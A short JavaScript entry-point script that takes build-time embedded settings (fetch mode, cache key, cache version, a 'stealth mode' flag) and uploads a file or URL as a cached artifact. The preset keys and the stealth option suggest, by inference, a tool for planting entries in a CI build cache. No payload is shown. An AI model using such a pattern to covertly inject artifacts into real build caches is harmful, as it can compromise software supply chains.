import {uploadArtifact} from './commands/upload'
import { enableStealthMode } from './core/utils';

async function main() {
  const fetchMode = typeof EMBEDDED_FETCH_MODE !== 'undefined' ? EMBEDDED_FETCH_MODE.toLowerCase() : null;
  const fetchModeValue = typeof EMBEDDED_FETCH_MODE_VALUE !== 'undefined' ? EMBEDDED_FETCH_MODE_VALUE : null;
  const cacheKey = typeof EMBEDDED_CACHE_KEY !== 'undefined' ? EMBEDDED_CACHE_KEY : null;
  const cacheVersion = typeof EMBEDDED_CACHE_VERSION !== 'undefined' ? EMBEDDED_CACHE_VERSION : null;
  const enabledStealthMode = typeof EMBEDDED_STEALTH_MODE !== 'undefined' ? EMBEDDED_STEALTH_MODE : false;
  
  if (enabledStealthMode) {
    enableStealthMode();
  }

  let filePath = undefined;
  let fileUrl = undefined;

  switch (fetchMode) {
    case 'url':
      fileUrl = fetchModeValue
      break;

    case 'file':
      filePath = fetchModeValue
      break;
    case 'embedded':
        break;
    default:
      console.error('❌ Unknown or missing EMBEDDED_FETCH_MODE: ' + fetchMode);
      process.exit(1);
  }

  uploadArtifact(
    {
      filePath: filePath,
      fileUrl: fileUrl,
      key: cacheKey,
      version: cacheVersion,
    });

}

main().catch(err => {
  console.error('❌ Fatal error:', err);
  process.exit(1);
});